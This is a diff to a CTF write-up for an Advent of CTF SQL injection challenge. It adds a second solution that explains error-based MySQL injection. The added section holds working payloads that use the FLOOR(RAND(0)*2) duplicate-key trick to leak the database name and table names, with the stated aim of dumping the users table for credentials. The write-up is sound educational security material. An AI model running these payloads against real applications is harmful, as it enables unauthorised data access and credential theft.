@@ -11,7 +11,7 @@ What you will learn today:
 - Deducing SQL queries
 - Manipulating SQL queries
 
-* Solution
+* Solution 1 - Using the injection
 :PROPERTIES:
 :ATTACH_DIR: /home/arjen/Projects/credmp.github.io/writeups/advent-of-ctf/challenge-5/index_att
 :END:
@@ -68,7 +68,6 @@ SELECT count(*)
 
 But that means you need to guess a username. That is not really fun of course. An alternative way would be to add conditions to the query that result in the same behavior. An example would be to do the following query =' OR username like 'a%' #=. The only guess here is that a username might start with an =a=, which is not unreasonable.
 
-Another way would be to use the error message as a vessel to extract information. [[https://maik.dev/posts/2020/12/challenge-5-adventofctf/][Maik]] wrote a great blog post on this challenge from that perspective.
 
 #+CAPTION: The flag
 [[file:index_att/flag.png]]
@@ -77,5 +76,72 @@ As always, be sure to grab the badge as well.
 
 #+CAPTION: The badge for today
 [[file:index_att/badge.png]]
+
+* Solution 2 - Extracting through the error message
+
+Another way would be to use the error message as a vessel to extract information. [[https://maik.dev/posts/2020/12/challenge-5-adventofctf/][Maik]] wrote a great blog post on this challenge from that perspective. I have recreated the instructions here below.
+
+#+CAPTION: Error extracting SQL query
+#+BEGIN_SRC sql
+' AND (SELECT 1 FROM
+         (SELECT COUNT(*),
+                 CONCAT(
+                    (SELECT database()),
+                    0x3a,
+                    FLOOR(RAND(0)*2)) x
+            FROM information_schema.tables GROUP BY x)
+         y) #
+#+END_SRC
+
+This is quite the payload. First the query has to return something, in this case it will return =1= from the table =y=. This table does not exist (yet), but for every row in =y= it would return =1=. In the case of the payload this does not actually do anything, as the payload will force an error.
+
+#+CAPTION: Error extracting SQL query
+#+BEGIN_SRC sql
+' AND (SELECT 1 FROM y) #
+#+END_SRC
+
+The =y= table is built using a sub query.
+
+#+CAPTION: Table subquery
+#+BEGIN_SRC sql
+SELECT COUNT(*),
+       CONCAT(
+         (SELECT database()),
+         0x3a,
+         FLOOR(RAND(0)*2)
+       ) x
+  FROM information_schema.tables
+ GROUP BY x
+#+END_SRC
+
+The =y= table will be constructed by taking a =count(*)=, which will be the number of times the 2nd column occurs in the result set. The 2nd column is a =CONCAT=, a string concatenation, of yet another sub query, in this case =SELECT database()=, the hex value =0x3a= (ascii character =:=) and a random value =0= or =1=.
+
+The sub query =SELECt database()= is the column of data that is to be extracted. The string concatenation with the random value will keep creating new rows for every row in the table it is queried from, in this case the =information_schema.tables=. It is important that the sub query (=select database()=) returns a single value and that the table it is used against has at least 3 rows so that a duplicate key will be created.
+
+So, in order to see what tables are part of the schema the =information_schema.tables= table can be queries with a =LIMIT= keyword to only return a single row.
+
+#+CAPTION: Payload to extract tables names
+#+BEGIN_SRC sql
+' AND (SELECT 1 FROM (
+SELECT COUNT(*),
+       CONCAT(
+         (SELECT table_name
+            FROM information_schema.tables
+           WHERE table_schema='testdb' LIMIT 0,1),
+         0x3a,
+         FLOOR(RAND(0)*2)
+       ) x
+  FROM information_schema.tables
+ GROUP BY x)
+         y) #
+#+END_SRC
+
+The result will be:
+
+#+BEGIN_QUOTE
+Error description: Duplicate entry 'users:1' for key 'group_key' 
+#+END_QUOTE
+
+Using this technique the =users= table can be exfiltrated giving a username and password and the challenge is solved.
 
 Go back to the [[../../../index.org][homepage]].
